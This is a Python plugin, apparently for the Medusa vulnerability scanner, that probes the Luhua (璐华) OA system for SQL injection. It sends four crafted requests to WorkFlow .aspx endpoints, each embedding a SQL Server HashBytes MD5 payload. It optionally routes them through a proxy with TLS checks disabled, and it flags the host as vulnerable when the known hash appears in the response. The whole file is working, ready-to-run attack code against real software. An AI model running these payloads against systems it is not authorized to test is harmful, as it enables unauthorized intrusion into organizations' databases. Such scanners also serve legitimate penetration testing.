#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 璐华OA系统多处SQL注入3
referer: http://www.wooyun.org/bugs/wooyun-2010-0104430
author: Lucifer
description: ruvaroa多处SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payloads = ["/WorkFlow/OfficeFileDownload.aspx?filename=1%27AnD%20%28Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))%29%3E0--",
                "/WorkFlow/wf_work_stat_setting.aspx?template_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
                "/WorkFlow/wf_work_form_save.aspx?office_missive_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
                "/WorkFlow/wf_get_fields_approve.aspx?template_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        for payload in payloads:
            payload_url = scheme+"://"+url+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if  con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
                Medusa = "{}存在璐华企业版OA系统多处SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas